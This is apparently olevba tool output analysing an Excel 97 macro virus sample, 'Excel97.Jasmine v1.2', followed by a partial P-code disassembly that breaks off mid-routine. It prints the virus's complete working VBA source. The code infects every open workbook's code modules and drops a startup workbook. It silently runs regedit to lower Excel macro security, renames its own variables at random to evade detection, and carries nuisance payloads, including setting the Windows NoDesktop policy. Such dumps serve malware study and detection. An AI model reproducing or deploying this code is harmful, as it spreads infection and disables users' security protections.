olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Jasmine
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Jasmine - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Pl6, Ff8Cv6 As Boolean
'Jasmine
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
Dim Gr3Dd0Mi4Aa1 As Object
Ie6Xh0Xq9Jy2Xo6Le3 = "c:\remove.reg": Dc3Iu8Cp2Cm1 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
 Set Gr3Dd0Mi4Aa1 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 Randomize
 If Gr3Dd0Mi4Aa1.Lines(5, 1) = "'Jasmine" Then
  Call Encode(Gr3Dd0Mi4Aa1)
  Tu4Wv5 = Gr3Dd0Mi4Aa1.Lines(1, _
   Gr3Dd0Mi4Aa1.CountOfLines)
  GoTo Ea1It5Ms4Gx7Vu8Ug2Ot7
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Qr8 = Workbooks(i).VBProject.VBComponents.Item(j)
  Vm1 = Qr8.Name
  Set Gr3Dd0Mi4Aa1 = Qr8.CodeModule
  If InStr(1, Vm1, "Sheet") Then
   If Gr3Dd0Mi4Aa1.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Gr3Dd0Mi4Aa1)
    Tu4Wv5 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Gr3Dd0Mi4Aa1.CountOfLines)
    GoTo Ea1It5Ms4Gx7Vu8Ug2Ot7
  End If
 Next
Next
Ea1It5Ms4Gx7Vu8Ug2Ot7:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
 If Pl6 <> True Then
  Pl6 = True: Ff8Cv6 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Gr3Dd0Mi4Aa1 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Gr3Dd0Mi4Aa1.Lines(5, 1) <> "'Jasmine" Then
  Gr3Dd0Mi4Aa1.InsertLines 1, Tu4Wv5
  Gr3Dd0Mi4Aa1.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Qr8 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Vm1 = Qr8.Name
   Set Infline = Qr8.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Vm1, "Sheet") Then
     Qr8.CodeModule.InsertLines 1, Tu4Wv5
     Qr8.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Ff8Cv6 = True Then
 Ff8Cv6 = False
 Workbooks("Book1.").Close savechanges:=True
 Open Ie6Xh0Xq9Jy2Xo6Le3 For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, Dc3Iu8Cp2Cm1 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, Dc3Iu8Cp2Cm1 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Dc3Iu8Cp2Cm1 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Dc3Iu8Cp2Cm1 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Ie6Xh0Xq9Jy2Xo6Le3, vbHide
 Kill Ie6Xh0Xq9Jy2Xo6Le3
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Oa6Oz6Uf9Xc9 = Chr(65 + Int(Rnd * 26))
    j = Oa6Oz6Uf9Xc9 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Oa6Oz6Uf9Xc9 & ":" _
     & Oa6Oz6Uf9Xc9).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Cw1Od6Tf2Ai8Mt9 As Long: Dim Zj3Nf2Qh4Kn3Pj3 As Long: Dim Hl8Bw4Ko3Oi9Hv7We5Sb4 As Long: Dim Je3Eb5Uu4Zi5Eu6 As Long
varray(1) = "Ie6Xh0Xq9Jy2Xo6Le3": varray(2) = "Gr3Dd0Mi4Aa1": varray(3) = "Tu4Wv5": varray(4) = "Qr8": varray(5) = "Vm1": varray(6) = "Dc3Iu8Cp2Cm1": varray(7) = "Pl6"
varray(8) = "Ff8Cv6": varray(9) = "Oa6Oz6Uf9Xc9": varray(10) = "Cw1Od6Tf2Ai8Mt9": varray(11) = "Zj3Nf2Qh4Kn3Pj3": varray(12) = "Hl8Bw4Ko3Oi9Hv7We5Sb4": varray(13) = "Je3Eb5Uu4Zi5Eu6": varray(14) = "Ea1It5Ms4Gx7Vu8Ug2Ot7"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Cw1Od6Tf2Ai8Mt9 = 1: Zj3Nf2Qh4Kn3Pj3 = 1: Hl8Bw4Ko3Oi9Hv7We5Sb4 = .CountOfLines: Je3Eb5Uu4Zi5Eu6 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Cw1Od6Tf2Ai8Mt9, Zj3Nf2Qh4Kn3Pj3, Hl8Bw4Ko3Oi9Hv7We5Sb4, Je3Eb5Uu4Zi5Eu6, True)
   strVal = .Lines(Cw1Od6Tf2Ai8Mt9, 1)
   strVal = Left(strVal, Zj3Nf2Qh4Kn3Pj3 - 1) & PolyVal & Mid(strVal, Je3Eb5Uu4Zi5Eu6)
   .ReplaceLine Cw1Od6Tf2Ai8Mt9, strVal
   Cw1Od6Tf2Ai8Mt9 = Hl8Bw4Ko3Oi9Hv7We5Sb4 + 1: Zj3Nf2Qh4Kn3Pj3 = 1
   Hl8Bw4Ko3Oi9Hv7We5Sb4 = .CountOfLines: Je3Eb5Uu4Zi5Eu6 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub


-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Jasmine - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Jasmine - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Jasmine - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Jasmine
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 9905 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Excel97.Jasmine v1.2"
' Line #1:
' 	QuoteRem 0x0000 0x001B "Copyright (c) 1999, cry0tek"
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn Pl6
' 	VarDefn Ff8Cv6 (As Boolean)
' Line #4:
' 	QuoteRem 0x0000 0x0007 "Jasmine"
' Line #5:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	Dim 
' 	VarDefn Gr3Dd0Mi4Aa1 (As Object)
' Line #8:
' 	LitStr 0x000D "c:\remove.reg"
' 	St Ie6Xh0Xq9Jy2Xo6Le3 
' 	BoS 0x0000 
' 	LitStr 0x002D "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	St Dc3Iu8Cp2Cm1 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #10:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Gr3Dd0Mi4Aa1 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsCall (Call) Encode 0x0001 
' Line #14:
' 	LineCont 0x0004 08 00 03 00
' 	LitDI2 0x0001 
' 	Ld Gr3Dd0Mi4Aa1 
' 	MemLd CountOfLines 
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsMemLd Lines 0x0002 
' 	St Tu4Wv5 
' Line #15:
' 	GoTo Ea1It5Ms4Gx7Vu8Ug2Ot7 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	SetStmt 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Qr8 
' Line #19:
' 	Ld Qr8 
' 	MemLd New 
' 	St Vm1 
' Line #20:
' 	SetStmt 
' 	Ld Qr8 
' 	MemLd CodeModule 
' 	Set Gr3Dd0Mi4Aa1 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Vm1 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #22:
' 	LineCont 0x0004 0C 00 04 00
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsCall (Call) Encode 0x0001 
' 	EndIf 
' Line #23:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld Gr3Dd0Mi4Aa1 
' 	MemLd CountOfLines 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Tu4Wv5 
' Line #24:
' 	GoTo Ea1It5Ms4Gx7Vu8Ug2Ot7 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Label Ea1It5Ms4Gx7Vu8Ug2Ot7 
' Line #29:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld Pl6 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitVarSpecial (True)
' 	St Pl6 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St Ff8Cv6 
' Line #32:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\BOOK1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Gr3Dd0Mi4Aa1 
' Line #37:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld Tu4Wv5 
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitDI2 0x0006 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Ld Gr3Dd0Mi4Aa1 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld ii 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Qr8 
' Line #43:
' 	Ld Qr8 
' 	MemLd New 
' 	St Vm1 
' Line #44:
' 	SetStmt 
' 	Ld Qr8 
' 	MemLd CodeModule 
' 	Set Infline 
' Line #45:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Infline 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "'Jasmine"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld Vm1 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld Tu4Wv5 
' 	Ld Qr8 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x0006 
' 	LitStr 0x001F "Private Sub WorkBook_Activate()"
' 	Ld Qr8 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	Ld Ff8Cv6 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (False)
' 	St Ff8Cv6 
' Line #55:
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #56:
' 	Ld Ie6Xh0Xq9Jy2Xo6Le3 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #58:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Dc3Iu8Cp2Cm1 
' 	LitStr 0x0013 "9.0\Excel\Security]"
' 	Concat 
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Dc3Iu8Cp2Cm1 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Dc3Iu8Cp2Cm1 
' 	LitStr 0x002C "8.0\New User\Settings\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Dc3Iu8Cp2Cm1 
' 	LitStr 0x001A "8.0\Excel\Microsoft Excel]"
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #70:
' 	LitStr 0x000B "regedit /s "
' 	Ld Ie6Xh0Xq9Jy2Xo6Le3 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #71:
' 	Ld Ie6Xh0Xq9Jy2Xo6Le3 
' 	ArgsCall Kill 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #77:
' 	LitDI2 0x0006 
' 	LitDI2 0x000A 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #78:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #79:
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	MemStWith Heading 
' Line #80:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x0022 "Since the only time I see her near"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0017 "Is when I close my eyes"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Should I keep it that way"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0023 "The only way I can make her stay..."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	MemStWith Then 
' Line #81:
' 	LitDI2 0x0016 
' 	MemStWith Animation 
' Line #82:
' 	ArgsMemCallWith Show 0x0000 
' Line #83:
' 	EndWith 
' Line #84:
' 	LitDI2 0x000B 
' 	LitDI2 0x0014 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0258 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ForStep 
' Line #86:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Oa6Oz6Uf9Xc9 
' Line #87:
' 	Ld Oa6Oz6Uf9Xc9 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St j 
' Line #88:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #89:
' 	LitStr 0x000F "Excel97.Jasmine"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #90:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #92:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #93:
' 	LitDI2 0x000A 
' 	MemStWith Size 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld j 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #96:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #97:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith ColorIndex 
' Line #98:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #99:
' 	EndWith 
' Line #100:
' 	LineCont 0x0004 05 00 05 00
' 	Ld Oa6Oz6Uf9Xc9 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld Oa6Oz6Uf9Xc9 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0015 
' 	LitDI2 0x001E 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	CaseTo 
' 	CaseDone 
' Line #104:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0009 "NoDesktop"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #105:
' 	LitDI2 0x001F 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0000 ""
' 	Ld vbInformation 
' 	LitStr 0x0014 "Excel97.Jasmine v1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub Encode(Loc As Object))
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn varray (As String)
' Line #113:
' 	Dim 
' 	VarDefn Cw1Od6Tf2Ai8Mt9 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Zj3Nf2Qh4Kn3Pj3 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Hl8Bw4Ko3Oi9Hv7We5Sb4 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn Je3Eb5Uu4Zi5Eu6 (As Long)
' Line #114:
' 	LitStr 0x0012 "Ie6Xh0Xq9Jy2Xo6Le3"
' 	LitDI2 0x0001 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Gr3Dd0Mi4Aa1"
' 	LitDI2 0x0002 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Tu4Wv5"
' 	LitDI2 0x0003 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Qr8"
' 	LitDI2 0x0004 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Vm1"
' 	LitDI2 0x0005 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Dc3Iu8Cp2Cm1"
' 	LitDI2 0x0006 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Pl6"
' 	LitDI2 0x0007 
' 	ArgsSt varray 0x0001 
' Line #115:
' 	LitStr 0x0006 "Ff8Cv6"
' 	LitDI2 0x0008 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "Oa6Oz6Uf9Xc9"
' 	LitDI2 0x0009 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Cw1Od6Tf2Ai8Mt9"
' 	LitDI2 0x000A 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Zj3Nf2Qh4Kn3Pj3"
' 	LitDI2 0x000B 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Hl8Bw4Ko3Oi9Hv7We5Sb4"
' 	LitDI2 0x000C 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000F "Je3Eb5Uu4Zi5Eu6"
' 	LitDI2 0x000D 
' 	ArgsSt varray 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Ea1It5Ms4Gx7Vu8Ug2Ot7"
' 	LitDI2 0x000E 
' 	ArgsSt varray 0x0001 
' Line #116:
' 	ArgsCall Read 0x0000 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #118:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #119:
' 	Ld PolyVal 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
